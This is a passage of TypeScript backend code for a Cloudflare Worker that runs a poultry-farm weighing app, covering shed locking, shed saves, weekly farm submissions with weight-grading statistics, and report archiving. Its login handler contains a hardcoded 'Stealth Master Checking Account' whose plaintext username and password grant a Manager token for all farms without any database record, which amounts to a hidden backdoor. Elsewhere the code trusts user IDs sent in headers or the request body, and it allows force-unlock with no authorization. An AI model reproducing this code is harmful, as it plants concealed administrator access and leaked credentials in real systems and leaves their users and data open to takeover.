                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              sheds,
            });
          }

          if (method === 'DELETE') {
            if (env.DB) {
              await env.DB.prepare('UPDATE farms SET is_archived = 1 WHERE id = ?').bind(farmId).run();
            }
            return jsonResponse({ success: true, message: 'Farm archived' });
          }
        }

        // POST /api/farms/:id/assign-operators - Assign Field Operators to Farm
        const farmAssignOperatorsMatch = path.match(/^\/farms\/([^/]+)\/assign-operators$/);
        if (farmAssignOperatorsMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmAssignOperatorsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const operatorUserIds: string[] = body.operatorUserIds || body.operatorIds || [];

          if (!Array.isArray(operatorUserIds)) {
            return errorResponse('operatorUserIds must be an array of user IDs', 400);
          }

          if (!env.DB) {
            return jsonResponse({
              success: true,
              farmId,
              assignedUserNames: [],
              count: 0,
            });
          }

          await ensureUsersTable(env);
          const farm = await env.DB.prepare('SELECT id, name FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) {
            return errorResponse('Farm not found in database', 404);
          }

          // Query all users to update their farm assignments
          const allUsersRes = await env.DB.prepare(
            'SELECT id, name, role, assigned_farms, assigned_farm_id FROM users'
          ).all().catch(() => ({ results: [] }));
          const allUsers = (allUsersRes.results || []) as any[];

          const updatedAssignedUserNames: string[] = [];

          for (const user of allUsers) {
            const isManagerOrAdmin = (user.role || '').toUpperCase() === 'ADMIN' || (user.role || '').toUpperCase() === 'MANAGER';
            // Only update assignments for field operators or explicit target users
            const isTarget = operatorUserIds.includes(user.id);

            // Skip modifying Admin/Manager assignedFarms unless explicitly targeted
            if (isManagerOrAdmin && !isTarget) {
              continue;
            }

            const currentSet = new Set<string>();
            if (user.assigned_farms) {
              try {
                const parsed = JSON.parse(user.assigned_farms);
                if (Array.isArray(parsed)) {
                  parsed.forEach((item: string) => {
                    if (item && item !== '*') currentSet.add(item);
                  });
                }
              } catch {}
            }

            let newAssignedFarmId = user.assigned_farm_id;

            if (isTarget) {
              currentSet.add(farm.id);
              currentSet.add(farm.name);
              newAssignedFarmId = farm.id;
              const r = (user.role || '').toUpperCase();
              const displayRole = (r === 'ADMIN' || r === 'MANAGER') ? 'Manager' : (r === 'INCHARGE' ? 'In-Charge' : 'Supervisor');
              updatedAssignedUserNames.push(`${user.name} (${displayRole})`);
            } else {
              currentSet.delete(farm.id);
              currentSet.delete(farm.name);
              if (newAssignedFarmId === farm.id) {
                const remaining = Array.from(currentSet).filter(id => id.startsWith('farm-'));
                newAssignedFarmId = remaining.length > 0 ? remaining[0] : null;
              }
            }

            const newAssignedFarmsJson = JSON.stringify(Array.from(currentSet));
            await env.DB.prepare(
              'UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?'
            ).bind(newAssignedFarmId, newAssignedFarmsJson, user.id).run().catch(() => {});
          }

          return jsonResponse({
            success: true,
            farmId,
            assignedUserNames: updatedAssignedUserNames,
            count: updatedAssignedUserNames.length,
          });
        }

        // PUT /api/farms/:id/details
        const farmDetailsMatch = path.match(/^\/farms\/([^/]+)\/details$/);
        if (farmDetailsMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmDetailsMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.name) {
            await env.DB.prepare('UPDATE farms SET name = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(body.name, farmId).run();
          }
          return jsonResponse({ success: true, message: 'Farm details updated' });
        }

        // PUT /api/farms/:id/sync
        const farmSyncMatch = path.match(/^\/farms\/([^/]+)\/sync$/);
        if (farmSyncMatch && method === 'PUT') {
          const farmId = decodeURIComponent(farmSyncMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          if (env.DB && body.sheds && Array.isArray(body.sheds)) {
            // Save state / sync lines
            for (const s of body.sheds) {
              for (const p of s.parts || []) {
                for (const l of p.lines || []) {
                  if (l.gender) {
                    await env.DB.prepare('UPDATE lines SET gender = ? WHERE id = ?').bind(l.gender.toUpperCase(), l.id).run().catch(() => {});
                  }
                }
              }
            }
          }
          return jsonResponse({ success: true, farmId });
        }

        // -------------------------------------------------------------
        // SHED CONCURRENCY LOCKING & OPERATOR ATTRIBUTION (LIVE-STATE)
        // -------------------------------------------------------------
        const liveStateFarmMatch = path.match(/^\/farms\/([^/]+)\/(?:shed-locks|live-state)$/);
        if (path === '/sheds/locks' || liveStateFarmMatch) {
          if (method === 'GET') {
            const farmIdParam = liveStateFarmMatch ? decodeURIComponent(liveStateFarmMatch[1]) : url.searchParams.get('farmId');
            const targetWeek = (url.searchParams.get('week') || 'W18').toUpperCase();
            const locks: Record<string, any> = {};
            let totalShedsCount = 0;
            let savedShedsCount = 0;
            let totalFarmBirdsCount = 0;

            if (env.DB) {
              await ensureShedWeekStatusTable(env);
              await ensureShedLockColumns(env);

              const allShedsRes = farmIdParam
                ? await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds WHERE farm_id = ?').bind(farmIdParam).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT id, farm_id, name, locked_by_user_id, locked_by_user_name, locked_at, last_heartbeat_at, locked_week, locked_batch_id, recorded_by_user_id, recorded_by_user_name FROM sheds').all().catch(() => ({ results: [] }));

              // Query shed saves for this week
              const swsRes = farmIdParam
                ? await env.DB.prepare('SELECT * FROM shed_week_status WHERE farm_id = ? AND UPPER(week) = ?').bind(farmIdParam, targetWeek).all().catch(() => ({ results: [] }))
                : await env.DB.prepare('SELECT * FROM shed_week_status WHERE UPPER(week) = ?').bind(targetWeek).all().catch(() => ({ results: [] }));
              
              const swsMap = new Map((swsRes.results || []).map((row: any) => [row.shed_id, row]));
              const shedsList = allShedsRes.results || [];
              totalShedsCount = shedsList.length;

              for (const s of shedsList) {
                const last = s.last_heartbeat_at ? new Date(s.last_heartbeat_at).getTime() : 0;
                const isLocked = Boolean(
                  s.locked_by_user_id &&
                  last &&
                  (Date.now() - last <= 120_000) &&
                  (!s.locked_week || s.locked_week.toUpperCase() === targetWeek)
                );
                const sws: any = swsMap.get(s.id);
                const isSaved = sws?.status === 'SAVED';
                if (isSaved) savedShedsCount++;

                const birdsInShed = sws?.total_bird_count || 0;
                totalFarmBirdsCount += birdsInShed;

                locks[s.id] = {
                  shedId: s.id,
                  shedName: s.name,
                  farmId: s.farm_id,
                  locked: isLocked,
                  lockedByUserId: isLocked ? s.locked_by_user_id : null,
                  lockedByUserName: isLocked ? s.locked_by_user_name : null,
                  lockedAt: isLocked ? s.locked_at : null,
                  lastHeartbeatAt: isLocked ? s.last_heartbeat_at : null,
                  // Stage 2: Team Visibility attributes strictly scoped to targetWeek
                  savedStatus: isSaved ? 'SAVED' : (birdsInShed > 0 ? 'DRAFT' : 'PENDING'),
                  savedByUserId: isSaved ? (sws?.saved_by_user_id || null) : null,
                  savedByUserName: isSaved ? (sws?.saved_by_user_name || null) : null,
                  totalBirdCount: birdsInShed,
                  savedAt: isSaved ? (sws?.saved_at || null) : null,
                  weights: sws?.weights_json ? (() => { try { return JSON.parse(sws.weights_json); } catch { return null; } })() : null,
                };
              }
            }

            const allShedsSaved = totalShedsCount > 0 && savedShedsCount >= totalShedsCount;
            return jsonResponse({
              locks,
              farmProgress: {
                totalShedsCount,
                savedShedsCount,
                totalFarmBirdsCount,
                allShedsSaved,
                progressPercent: totalShedsCount > 0 ? Math.round((savedShedsCount / totalShedsCount) * 100) : 0,
              },
              allShedsSaved,
              week: targetWeek,
              farmId: farmIdParam,
            });
          }
        }

        // -------------------------------------------------------------
        // PERMANENT SHED LOCK: BLOCK POST-CREATION RENAME & DELETE
        // -------------------------------------------------------------
        const singleShedMatch = path.match(/^\/sheds\/([^/]+)$/);
        if (singleShedMatch && (method === 'DELETE' || method === 'PUT' || method === 'PATCH')) {
          return errorResponse('Sheds are permanently locked at farm creation and cannot be renamed or deleted.', 403);
        }

        // POST /api/sheds/:shedId/enter
        const shedEnterMatch = path.match(/^\/sheds\/([^/]+)\/enter$/);
        if (shedEnterMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedEnterMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const userName = body.userName || body.lockedByUserName || request.headers.get('x-user-username') || 'Incharge';
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const targetBatchId = body.batchId || null;

          if (!userId) {
            return errorResponse('Authentication required. Please log in.', 401);
          }

          if (env.DB) {
            await ensureShedLockColumns(env);
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name || 'Another Incharge',
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            const nowIso = new Date().toISOString();
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = ?, 
                locked_by_user_name = ?, 
                locked_at = ?, 
                last_heartbeat_at = ?,
                locked_week = ?,
                locked_batch_id = ?
              WHERE id = ?
            `).bind(userId, userName, nowIso, nowIso, targetWeek, targetBatchId, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(shed.farm_id).run().catch(() => {});

            return jsonResponse({
              success: true,
              locked: true,
              shedId,
              shedName: shed.name,
              lockedByUserId: userId,
              lockedByUserName: userName,
              lockedAt: nowIso,
              lastHeartbeatAt: nowIso,
              week: targetWeek,
            });
          }

          return jsonResponse({ success: true, locked: true, shedId, lockedByUserId: userId, lockedByUserName: userName });
        }

        // POST /api/sheds/:shedId/heartbeat
        const shedHeartbeatMatch = path.match(/^\/sheds\/([^/]+)\/heartbeat$/);
        if (shedHeartbeatMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedHeartbeatMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const userId = body.userId || body.lockedByUserId || request.headers.get('x-user-id');
          const targetWeek = (body.week || request.headers.get('x-week') || '').toUpperCase() || null;
          const nowIso = new Date().toISOString();

          if (env.DB) {
            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);

            const last = shed.last_heartbeat_at ? new Date(shed.last_heartbeat_at).getTime() : 0;
            const isLocked = Boolean(
              shed.locked_by_user_id &&
              last &&
              (Date.now() - last <= 120_000) &&
              (!shed.locked_week || !targetWeek || shed.locked_week.toUpperCase() === targetWeek)
            );

            if (userId && shed.locked_by_user_id && shed.locked_by_user_id !== userId && isLocked) {
              return new Response(JSON.stringify({
                locked: true,
                lockedByUserId: shed.locked_by_user_id,
                lockedByUserName: shed.locked_by_user_name,
                message: `⚠️ ${shed.name} is currently being weighed by ${shed.locked_by_user_name || 'another Incharge'}. Only one Incharge can enter a shed at a time.`
              }), {
                status: 409,
                headers: { 'Content-Type': 'application/json', ...CORS_HEADERS, ...NO_CACHE_HEADERS }
              });
            }

            await env.DB.prepare('UPDATE sheds SET last_heartbeat_at = ? WHERE id = ?').bind(nowIso, shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, lastHeartbeatAt: nowIso });
        }

        // POST /api/sheds/:shedId/leave
        const shedLeaveMatch = path.match(/^\/sheds\/([^/]+)\/leave$/);
        if (shedLeaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedLeaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const recordedByUserId = body.recordedByUserId || body.userId;
          const recordedByUserName = body.recordedByUserName || body.userName;

          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }

          return jsonResponse({ success: true, shedId, locked: false, recordedByUserId, recordedByUserName });
        }

        // POST /api/sheds/:shedId/force-unlock
        const shedForceUnlockMatch = path.match(/^\/sheds\/([^/]+)\/force-unlock$/);
        if (shedForceUnlockMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedForceUnlockMatch[1]);
          if (env.DB) {
            await env.DB.prepare(`
              UPDATE sheds SET 
                locked_by_user_id = NULL, 
                locked_by_user_name = NULL, 
                locked_at = NULL, 
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }
          return jsonResponse({ success: true, shedId, locked: false, message: 'Shed forcibly unlocked' });
        }

        // -------------------------------------------------------------
        // STAGE 2: SHED-WISE "SAVE SHED" (TEAM VISIBLE, NOT SUBMISSION HISTORY)
        // -------------------------------------------------------------
        const shedSaveMatch = path.match(/^\/sheds\/([^/]+)\/save-shed$/);
        if (shedSaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedSaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const targetWeek = (body.week || 'W18').toUpperCase();
          const userId = body.userId || body.savedByUserId || request.headers.get('x-user-id') || 'incharge-1';
          const userName = body.userName || body.savedByUserName || request.headers.get('x-user-username') || 'Incharge 1';
          let totalBirdCount = Number(body.totalBirdCount || 0);

          if (env.DB) {
            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);
            const farmId = shed.farm_id;

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const batchId = body.batchId || activeBatch?.id;

            // 1. Persist all bird weights recorded in that shed if weights array/map provided
            if (body.weights && Array.isArray(body.weights)) {
              let countedBirds = 0;
              for (const lineItem of body.weights) {
                if (!lineItem.lineId) continue;
                const lineId = lineItem.lineId;
                const lineWeights: number[] = Array.isArray(lineItem.weights) ? lineItem.weights : [];
                countedBirds += lineWeights.length;

                // Clear previous week weights for this line in this batch
                await env.DB.prepare(`
                  DELETE FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
                `).bind(lineId, targetWeek, batchId).run().catch(() => {});

                // Get line std
                const lineRow = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
                const std = lineRow?.std_weight_grams || (lineRow?.gender === 'MALE' ? 150 : 140);

                for (let idx = 0; idx < lineWeights.length; idx++) {
                  const wVal = Number(lineWeights[idx]);
                  if (isNaN(wVal) || wVal <= 0) continue;
                  const wId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
                  await env.DB.prepare(`
                    INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week, batch_id) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                  `).bind(wId, lineId, idx + 1, wVal, std, userName, targetWeek, batchId).run().catch(() => {});
                }
              }
              if (countedBirds > 0 || totalBirdCount === 0) {
                totalBirdCount = countedBirds;
              }
            } else if (!totalBirdCount) {
              // Query bird weights count for this shed and batch
              const countRes = await env.DB.prepare(`
                SELECT COUNT(bw.id) as total_birds
                FROM bird_weights bw
                JOIN lines l ON bw.line_id = l.id
                JOIN parts p ON l.part_id = p.id
                WHERE p.shed_id = ? AND UPPER(bw.week) = ? AND (bw.batch_id = ? OR bw.batch_id IS NULL)
              `).bind(shedId, targetWeek, batchId).first() as any;
              if (countRes && countRes.total_birds !== undefined) {
                totalBirdCount = countRes.total_birds;
              }
            }

            // 2. Mark shed status for that week as SAVED in shed_week_status with batch_id and weights_json
            const weightsJson = body.weights ? JSON.stringify(body.weights) : null;
            await env.DB.prepare(`
              INSERT INTO shed_week_status (shed_id, farm_id, week, status, saved_by_user_id, saved_by_user_name, total_bird_count, weights_json, batch_id, saved_at)
              VALUES (?, ?, ?, 'SAVED', ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
              ON CONFLICT(shed_id, week) DO UPDATE SET
                status = 'SAVED',
                saved_by_user_id = excluded.saved_by_user_id,
                saved_by_user_name = excluded.saved_by_user_name,
                total_bird_count = excluded.total_bird_count,
                weights_json = excluded.weights_json,
                batch_id = excluded.batch_id,
                saved_at = CURRENT_TIMESTAMP
            `).bind(shedId, farmId, targetWeek, userId, userName, totalBirdCount, weightsJson, batchId).run();

            // 3. Release active lock
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL,
                recorded_by_user_id = ?,
                recorded_by_user_name = ?
              WHERE id = ?
            `).bind(userId, userName, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(farmId).run().catch(() => {});

            // 4. Log to activity_logs
            const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
            await env.DB.prepare(`
              INSERT INTO activity_logs (id, farm_id, user_name, action, shed_name, sample_count)
              VALUES (?, ?, ?, 'SAVED_SHED', ?, ?)
            `).bind(logId, farmId, userName, shed.name, totalBirdCount).run().catch(() => {});
          }

          // CRITICAL: NEVER write to submissions table on save-shed!
          return jsonResponse({
            success: true,
            shedId,
            week: targetWeek,
            status: 'SAVED',
            savedByUserId: userId,
            savedByUserName: userName,
            totalBirdCount,
            message: `Shed saved successfully with ${totalBirdCount} birds. Visible to team.`
          });
        }

        // -------------------------------------------------------------
        // STAGE 3: OVERALL FARM "FINAL SUBMIT" (WRITES TO SUBMISSIONS TABLE)
        // -------------------------------------------------------------
        const farmWeekSubmitMatch = path.match(/^\/farms\/([^/]+)\/weeks\/([^/]+)\/submit$/);
        if (farmWeekSubmitMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmWeekSubmitMatch[1]);
          const weekNumber = decodeURIComponent(farmWeekSubmitMatch[2]).toUpperCase();
          const body = await request.json().catch(() => ({})) as any;
          const submittedBy = body.submittedBy || body.userName || 'Field Supervisor';
          const submittedRole = body.submittedRole || body.userRole || 'SUPERVISOR';

          if (!env.DB) {
            return jsonResponse({ success: true, submissionId: `sub-${Date.now()}`, status: 'SUBMITTED', farmId, week: weekNumber });
          }

          await ensureShedWeekStatusTable(env);
          await ensureBatchesTable(env);

          const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) return errorResponse('Farm not found', 404);

          const activeBatch = await ensureFarmActiveBatch(env, farm);
          const batchId = body.batchId || activeBatch?.id;
          const batchName = body.batchName || activeBatch?.batchName || 'Batch 1';

          // Aggregate all sheds, parts, lines, and weights for weekNumber and batchId
          const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
          const allSheds = shedsRes.results || [];

          const shedWeekStatuses = await env.DB.prepare(`
            SELECT * FROM shed_week_status 
            WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
          `).bind(farmId, weekNumber, batchId).all().catch(() => ({ results: [] }));
          const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

          let totalFarmBirds = 0;
          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];
          const shedsBreakdown: any[] = [];

          for (const s of allSheds) {
            const sws: any = swsMap.get(s.id);
            const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
            let shedBirdCount = 0;
            const partsList: any[] = [];

            for (const p of partsRes.results || []) {
              const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
              const linesList: any[] = [];

              for (const l of linesRes.results || []) {
                const weightsRes = await env.DB.prepare(`
                  SELECT weight_grams FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) 
                  ORDER BY entry_index ASC
                `).bind(l.id, weekNumber, batchId).all();
                const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

                shedBirdCount += weights.length;
                totalFarmBirds += weights.length;

                if (l.gender === 'FEMALE') {
                  allFemaleWeights.push(...weights);
                } else {
                  allMaleWeights.push(...weights);
                }

                linesList.push({
                  id: l.id,
                  name: l.name,
                  gender: l.gender,
                  stdWeight: l.std_weight_grams,
                  weights,
                  count: weights.length,
                });
              }

              partsList.push({
                id: p.id,
                name: p.name,
                lines: linesList,
              });
            }

            const effectiveBirdCount = shedBirdCount > 0 ? shedBirdCount : (sws?.total_bird_count || 0);
            if (shedBirdCount === 0 && effectiveBirdCount > 0) {
              totalFarmBirds += effectiveBirdCount;
            }

            shedsBreakdown.push({
              shedId: s.id,
              shedName: s.name,
              status: sws?.status || (effectiveBirdCount > 0 ? 'SAVED' : 'DRAFT'),
              savedByUserId: sws?.saved_by_user_id || s.recorded_by_user_id || null,
              savedByUserName: sws?.saved_by_user_name || s.recorded_by_user_name || 'Incharge',
              birdCount: effectiveBirdCount,
              parts: partsList,
            });
          }

          // Compute Statistics with grading bands (MB, B, S, A, MA) and CV%
          const parsedWeekNum = parseInt(weekNumber.replace(/\D/g, '') || '18', 10);
          const calcStats = (weights: number[], stdWeight: number = 140) => {
            const count = weights.length;
            if (count === 0) {
              return { 
                count: 0, avg: 0, stdDev: 0, cv: 0, uniformity: 0,
                grades: { MB: 0, B: 0, S: 0, A: 0, MA: 0 },
                gradePercents: { MB: 0, B: 0, S: 0, A: 0, MA: 0 }
              };
            }
            const avg = Math.round((weights.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const variance = count > 1 ? weights.reduce((acc, val) => acc + Math.pow(val - avg, 2), 0) / (count - 1) : 0;
            const stdDev = Math.round(Math.sqrt(variance) * 10) / 10;
            const cv = avg > 0 ? Math.round((stdDev / avg) * 10000) / 100 : 0;
            const inRange = weights.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            const uniformity = Math.round((inRange / count) * 1000) / 10;

            const tolerance = parsedWeekNum <= 3 ? 25 : parsedWeekNum <= 8 ? 50 : parsedWeekNum <= 14 ? 75 : 100;
            const sMin = stdWeight - tolerance;
            const sMax = stdWeight + tolerance;
            const bMin = stdWeight - 2 * tolerance;
            const aMax = stdWeight + 2 * tolerance;

            let mb = 0, b = 0, s = 0, a = 0, ma = 0;
            for (const w of weights) {
              if (w < bMin) mb++;
              else if (w < sMin) b++;
              else if (w <= sMax) s++;
              else if (w <= aMax) a++;
              else ma++;
            }

            return { 
              count, avg, stdDev, cv, uniformity,
              stdWeight,
              grades: { MB: mb, B: b, S: s, A: a, MA: ma },
              gradePercents: {
                MB: Math.round((mb / count) * 1000) / 10,
                B: Math.round((b / count) * 1000) / 10,
                S: Math.round((s / count) * 1000) / 10,
                A: Math.round((a / count) * 1000) / 10,
                MA: Math.round((ma / count) * 1000) / 10,
              }
            };
          };

          const femaleStats = calcStats(allFemaleWeights, 140);
          const maleStats = calcStats(allMaleWeights, 150);

          const snapshot = {
            submissionId: `sub-${Date.now()}`,
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            flockAge: weekNumber,
            season: farm.season || 'Summer',
            submittedAt: new Date().toISOString(),
            submittedBy,
            submittedRole,
            totalBirds: totalFarmBirds,
            femaleStats,
            maleStats,
            sheds: shedsBreakdown,
          };

          const submissionId = snapshot.submissionId;
          const dataJson = JSON.stringify(snapshot);
          const r2Key = `reports/${farmId}/${submissionId}.json`;

          // Write ONE single consolidated record to submissions with batch_id and batch_name
          await env.DB.prepare(`
            INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json, batch_id, batch_name)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
          `).bind(submissionId, farmId, weekNumber, farm.season || 'Summer', totalFarmBirds, submittedBy, submittedRole, r2Key, dataJson, batchId, batchName).run();

          // R2 Storage archive if available
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: { farmId, submissionId, submittedBy, week: weekNumber, batchName },
            }).catch(() => {});
          }

          // Activity Log
          const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
          await env.DB.prepare(`
            INSERT INTO activity_logs (id, farm_id, user_name, action, sample_count)
            VALUES (?, ?, ?, 'FARM_FINAL_SUBMIT', ?)
          `).bind(logId, farmId, submittedBy, totalFarmBirds).run().catch(() => {});

          return jsonResponse({
            success: true,
            submissionId,
            status: 'SUBMITTED',
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            week: weekNumber,
            totalBirds: totalFarmBirds,
            message: `Farm ${farm.name} (${batchName}) week ${weekNumber} overall submission completed successfully.`,
          }, 201);
        }

        // -------------------------------------------------------------
        // F. SUBMISSIONS & REPORTS (Cloudflare R2 + D1 15 GB+ Archive)
        // -------------------------------------------------------------
        if ((path === '/submissions' || path === '/submissions/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const submissionId = `sub-${Date.now()}`;
          const farmId = body.farmId || 'default-farm';
          const flockAge = body.flockAge || 'W1';
          const submittedBy = body.metadata?.submittedBy || 'Supervisor';
          const submittedRole = body.metadata?.submittedRole || 'SUPERVISOR';
          const totalBirds = body.metadata?.totalBirds || 0;
          const dataJson = JSON.stringify(body);

          let r2Key = `reports/${farmId}/${submissionId}.json`;

          // Store full batch payload in Cloudflare R2 bucket
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: {
                farmId,
                submissionId,
                submittedBy,
              },
            });
          }

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            `).bind(submissionId, farmId, flockAge, body.season || 'Summer', totalBirds, submittedBy, submittedRole, r2Key, dataJson).run();
          }

          return jsonResponse({
            success: true,
            status: 'COMPLETED',
            submissionId,
            r2ReportKey: r2Key,
            message: 'Weighing batch archived to Cloudflare D1 + R2 Storage',
          }, 201);
        }

        if ((path === '/submissions' || path === '/submissions/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) return jsonResponse([]);

          const subs = farmId
            ? await env.DB.prepare('SELECT * FROM submissions WHERE farm_id = ? ORDER BY created_at DESC').bind(farmId).all()
            : await env.DB.prepare('SELECT * FROM submissions ORDER BY created_at DESC LIMIT 50').all();

          return jsonResponse((subs.results || []).map((s: any) => ({
            ...s,
            batchId: s.batch_id,
            batchName: s.batch_name || 'Batch 1',
          })));
        }

        // GET /api/reports - lists or retrieves archived R2 files
        if (path === '/reports' || path === '/reports/') {
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            const list = await bucket.list({ prefix: 'reports/' });
            return jsonResponse({
              success: true,
              storageType: 'Cloudflare R2 (15 GB+ Object Storage)',
              reports: list.objects.map((o: any) => ({ key: o.key, size: o.size, uploaded: o.uploaded })),
            });
          }
          return jsonResponse({
            success: true,
            storageType: 'Cloudflare D1 Native',
            reports: [],
          });
        }

        // -------------------------------------------------------------
        // G. AUTH & USERS (Role-Based Access Control: Manager & In-Charge Only)
        // -------------------------------------------------------------
        if (path === '/auth/login' && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const rawUsername = (body.username || '').trim();
          const username = rawUsername.toLowerCase();
          const password = (body.password || '').trim();

          // PART 2: Stealth Master Checking Account
          if (username === 'shreedhar') {
            if (password !== 'Shreedhar@123') {
              return errorResponse('Invalid username or password', 401);
            }
            return jsonResponse({
              token: `cf-token-master-${Date.now()}`,
              user: {
                id: 'user-master-shreedhar',
                employeeCode: 'EMP0001',
                username: 'shreedhar',
                name: 'Shreedhar',
                userName: 'Shreedhar',
                role: 'Manager',
                userRole: 'Manager',
                assignedFarms: ['*'],
                status: 'ACTIVE',
                isAuthenticated: true,
              },
            });
          }

          // Check database users if env.DB bound (support lookup by phone/email, name, id, or employee_code like EMP0008)
          if (env.DB) {
            await ensureUsersTable(env);
            const dbUser = await env.DB.prepare(`
              SELECT * FROM users 
              WHERE LOWER(phone_or_email) = ? OR LOWER(name) = ? OR id = ? OR UPPER(employee_code) = ?
            `).bind(username, username, rawUsername, rawUsername.toUpperCase()).first() as any;

            if (dbUser) {
              const uRoleRaw = (dbUser.role || 'SUPERVISOR').toUpperCase();
              let normalizedRole: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (uRoleRaw === 'ADMIN' || uRoleRaw === 'MANAGER') normalizedRole = 'Manager';
              else if (uRoleRaw === 'INCHARGE' || uRoleRaw === 'IN-CHARGE') normalizedRole = 'In-Charge';
